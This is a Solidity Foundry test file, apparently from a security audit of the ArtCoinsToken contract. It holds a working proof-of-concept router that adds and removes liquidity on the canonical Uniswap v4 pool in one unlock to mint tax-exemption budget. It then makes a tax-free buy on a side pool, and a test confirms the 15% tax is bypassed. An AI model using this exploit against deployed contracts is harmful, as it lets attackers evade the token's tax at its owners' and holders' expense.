// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ArtCoinsToken} from "../../../../src/ArtCoinsToken.sol";
import {TaxConfig, TaxVenue} from "../../../../src/interfaces/IArtCoinsTaxable.sol";
import {HMEthSink, HMReferralPayout, HooksMevBase} from "./HooksMevBase.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

/// in one unlock: add then remove liquidity on the CANONICAL pool (net zero,
/// flash accounted, attests the removed PCT as exemption budget), then buy on
/// a side v4 pool and take. the side outflow eats the canonical budget.
contract HMBudgetRouter is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager immutable pm;

    constructor(IPoolManager pm_) {
        pm = pm_;
    }

    struct Args {
        PoolKey canon;
        PoolKey side;
        uint256 liq;
        int24 lower;
        int24 upper;
        uint256 ethIn;
        address to;
        bool doBudget;
    }

    function run(Args calldata a) external payable {
        pm.unlock(abi.encode(a));
    }

    function unlockCallback(bytes calldata raw) external returns (bytes memory) {
        Args memory a = abi.decode(raw, (Args));
        if (a.doBudget) {
            IPoolManager.ModifyLiquidityParams memory p = IPoolManager.ModifyLiquidityParams({
                tickLower: a.lower, tickUpper: a.upper, liquidityDelta: int256(a.liq), salt: 0
            });
            pm.modifyLiquidity(a.canon, p, "");
            p.liquidityDelta = -int256(a.liq);
            pm.modifyLiquidity(a.canon, p, "");
        }
        pm.swap(
            a.side,
            IPoolManager.SwapParams({
                zeroForOne: true,
                amountSpecified: -int256(a.ethIn),
                sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
            }),
            ""
        );
        Currency eth = a.side.currency0;
        Currency tok = a.side.currency1;
        int256 d0 = pm.currencyDelta(address(this), eth);
        int256 d1 = pm.currencyDelta(address(this), tok);
        if (d0 < 0) pm.settle{value: uint256(-d0)}();
        if (d1 > 0) pm.take(tok, a.to, uint256(d1));
        return "";
    }
}

contract TaxBudgetTest is HooksMevBase {
    ArtCoinsToken internal tok;
    PoolKey internal canon;
    PoolKey internal side;
    HMBudgetRouter internal router;
    address internal buyer = address(0xB0B);

    function setUp() public override {
        super.setUp();
        TaxConfig memory tc = TaxConfig({
            enabled: true,
            taxBps: 1500,
            taxBpsMax: 2000,
            burnAddress: address(0xdEaD),
            poolManager: address(pm),
            canonicalHook: address(skimHook),
            pairedToken: address(0),
            canonicalPoolFee: DYNAMIC_FEE,
            canonicalTickSpacing: TS,
            exempt: new address[](0),
            venues: new TaxVenue[](0)
        });
        tok = new ArtCoinsToken(
            "P", "P", 1_000_000_000 ether, address(this), "", "", "", address(0), tc
        );
        tok.approve(address(liqRouter), type(uint256).max);
        tok.approve(address(swapRouter), type(uint256).max);

        canon = _skimPool(
            address(tok),
            _skimFeeData(6000, 8333, 0, address(new HMEthSink()), address(new HMReferralPayout())),
            address(0x10C),
            address(0)
        );
        assertTrue(skimHook.poolTaxEnabled(PoolId.wrap(_id(canon))), "canonical tax attest path on");
        _addLiquidity(canon, -6000, 6000, 1000 ether);

        side = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(tok)),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(address(0))
        });
        pm.initialize(side, TickMath.getSqrtPriceAtTick(0));
        _addLiquidity(side, -6000, 6000, 1000 ether);

        router = new HMBudgetRouter(pm);
        vm.deal(address(router), 0);
    }

    function _id(PoolKey memory k) internal pure returns (bytes32) {
        return keccak256(abi.encode(k));
    }

    function _buy(bool doBudget) internal returns (uint256 received) {
        uint256 b0 = tok.balanceOf(buyer);
        router.run{value: 1 ether}(
            HMBudgetRouter.Args({
                canon: canon,
                side: side,
                liq: 100 ether,
                lower: -1200,
                upper: -600,
                ethIn: 1 ether,
                to: buyer,
                doBudget: doBudget
            })
        );
        received = tok.balanceOf(buyer) - b0;
    }

    /// H14: zero-capital tax bypass. the side-pool buy is taxed 15% normally;
    /// prefixing a same-unlock add+remove on the canonical pool (no tokens
    /// held, nothing transferred) attests ~2.8e18 PCT of budget and the side
    /// buy is fully exempt. the router never holds PCT.
    function test_bug_H14_addRemoveCanonicalLiquidityMintsTaxBudget() public {
        uint256 snap = vm.snapshotState();
        uint256 taxed = _buy(false);
        uint256 dead0 = tok.balanceOf(address(0xdEaD));
        assertGt(dead0, 0, "baseline side buy is taxed");
        vm.revertToState(snap);

        uint256 free = _buy(true);
        assertEq(tok.balanceOf(address(0xdEaD)), 0, "no tax burned");
        assertGt(free, taxed * 117 / 100, "received ~1/0.85 more");
        assertEq(tok.balanceOf(address(router)), 0, "router held no PCT at any point");
        emit log_named_uint("taxed buy received ", taxed);
        emit log_named_uint("budget buy received", free);
    }
}
